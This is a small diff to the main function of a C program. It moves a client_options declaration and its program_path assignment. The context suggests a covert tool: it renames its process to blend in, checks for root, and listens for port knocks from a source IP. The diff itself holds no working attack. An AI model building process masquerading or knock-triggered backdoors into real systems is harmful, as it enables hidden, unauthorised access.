@@ -172,6 +172,8 @@ void rename_process_to_most_common(const int argc, char * argv[]) {
 }
 
 int main(const int argc, char * argv[]) {
+    struct client_options client_options;
+    client_options.program_path = argv[0];
     // Check if running as root
     if (geteuid() != 0) {
         fprintf(stderr, "Warning: Not running as root.\n");
@@ -194,14 +196,12 @@ int main(const int argc, char * argv[]) {
 
     // Buffer to store knock source IP
     char knock_source_ip[INET_ADDRSTRLEN] = {0};
-    struct client_options client_options;
     client_options.host = get_local_address();
     client_options.interface_name = get_local_interface_name();
     client_options.port = 30;
     client_options.max_bytes = 2048;
     client_options.poll_ms = 200;
     client_options.knock_source_ip = knock_source_ip;
-    client_options.program_path = argv[0];
 
     int return_val = parse_arguments(argc, argv, &client_options);
     if (return_val != 0) {
